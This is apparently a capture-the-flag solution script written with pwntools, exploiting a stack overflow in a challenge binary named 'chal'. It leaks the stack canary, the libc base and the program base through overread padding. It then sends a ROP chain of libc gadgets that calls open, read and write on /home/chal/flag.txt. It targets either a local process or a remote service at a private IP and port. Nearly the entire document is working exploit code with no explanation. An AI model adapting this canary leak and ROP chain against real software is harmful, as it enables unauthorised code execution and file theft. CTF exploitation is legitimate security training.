from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

local = False

# local
# 0x00000000000420b3 : pop rax ; ret
# 0x0000000000028265 : pop rdi ; ret
# 0x0000000000029cf1 : pop rsi ; ret
# 0x00000000001249da : pop rdx ; ret
# 0x0000000000088859 : pop rdx ; pop rbx ; ret
# 0x000000000003b0c7 : pop r12 ; pop r13 ; ret
# 0x000000000009f0e1 : pop r12 ; pop r14 ; ret
# 0x0000000000026656 : pop r12 ; ret
# 0x10352f:: syscall ; ... ; ret


# remote
# 0x0000000000045eb0 : pop rax ; ret
# 0x000000000002a3e5 : pop rdi ; ret
# 0x000000000002be51 : pop rsi ; ret
# 0x000000000003bad3 : pop rdx ; retf 0x19
# 0x0000000000090529 : pop rdx ; pop rbx ; ret
# 0x0000000000041c48 : pop r12 ; pop r13 ; ret
# 0x000000000011b918 : pop r12 ; pop r14 ; ret
# 0x0000000000035731 : pop r12 ; ret
# 0x114990 : syscall ; ... ; ret


def calc(base: int):
    global pop_rax, pop_rdi, pop_rsi, pop_rdx, pop_rdx_rbx, pop_r12_r13, pop_r12, syscall
    if local:
        pop_rax = base + 0x00000000000420B3
        pop_rdi = base + 0x0000000000028265
        pop_rsi = base + 0x0000000000029CF1
        pop_rdx = base + 0x00000000001249DA
        pop_rdx_rbx = base + 0x0000000000088859
        pop_r12_r13 = base + 0x000000000003B0C7
        pop_r12 = base + 0x0000000000026656
        syscall = base + 0x000000000010352F
    else:
        pop_rax = base + 0x0000000000045EB0
        pop_rdi = base + 0x000000000002A3E5
        pop_rsi = base + 0x000000000002BE51
        pop_rdx = base + 0x000000000003BAD3
        pop_rdx_rbx = base + 0x0000000000090529
        pop_r12_r13 = base + 0x0000000000041C48
        pop_r12 = base + 0x0000000000035731
        syscall = base + 0x0000000000114990


def main(r):
    r.recvuntil(b"Haaton's name? ")
    r.send(b"A" * 20)
    r.recvline()
    r.recvline()

    payload = b"HACHAMA\x00" * 7 + b"A"
    r.send(payload)
    ret = r.recv()
    for i in range(7):
        assert ret[i * 8 : i * 8 + 7] == b"HACHAMA"
    assert ret[56:57] == b"A"
    ret = bytearray(ret)
    ret[56] = 0
    canary = u64(ret[56 : 56 + 8])
    log.info(f"{canary = :x}")

    payload = b"HACHAMA\x00" * 9
    r.send(payload)
    ret = r.recv()
    for i in range(9):
        assert ret[i * 8 : i * 8 + 7] == b"HACHAMA", ret[i * 8 : i * 8 + 7]
    ret = bytearray(ret)
    if local:
        libc_base = u64(ret[72 : 72 + 8]) - 0x27CD0
    else:
        libc_base = u64(ret[72 : 72 + 8]) - 0x29D90
    log.info(f"{libc_base = :x}")
    calc(libc_base)

    payload = b"HACHAMA\x00" * 11
    r.send(payload)
    ret = r.recv()
    for i in range(11):
        assert ret[i * 8 : i * 8 + 7] == b"HACHAMA", ret[i * 8 : i * 8 + 7]
    ret = bytearray(ret)
    self_base = u64(ret[88 : 88 + 8]) - 0x1331
    log.info(f"{self_base = :x}")
    main_298 = self_base + 0x145B
    main_301 = self_base + 0x145E
    main_313 = self_base + 0x146A

    # anchor = u64(b"HACHAMA".ljust(8, b"\x00"))

    bss = self_base + 0x4240
    buf = bss - 0x70
    log.info(f"{bss = :x}")

    payload = flat(
        {
            0x38: [
                canary,
                bss,
                pop_rax,
                0x400,
                main_298,
            ]
        }
    )
    r.send(payload)
    # ret = r.recv()
    # print(ret)
    input("Press Enter to continue...")
    payload = flat(
        {
            0x00: b"/home/chal/flag.txt\x00",
            0x38: [
                canary,
                bss,
                pop_rax,
                2,
                pop_rdi,
                bss - 0x40,
                pop_rsi,
                0x0,
                pop_rdx_rbx,
                0,
                0,
                syscall,
                pop_rax,
                0,
                pop_rdi,
                3,
                pop_rsi,
                buf,
                pop_rdx_rbx,
                0x100,
                0,
                syscall,
                pop_rax,
                1,
                pop_rdi,
                1,
                pop_rsi,
                buf,
                pop_rdx_rbx,
                0x100,
                0,
                syscall,
            ],
        }
    )
    r.send(payload)
    flag = r.recvline().decode().strip()
    log.info(flag)


if __name__ == "__main__":
    if local:
        r = process("./share/chal")
        attach(
            r,
            """
            b *main+313
            conti
            x/12gx $rbp-0x40
            conti
            conti
            conti
            x/12gx $rbp-0x40
            """,
        )
    else:
        r = remote("10.113.184.121", 10056)
    main(r)
    r.close()
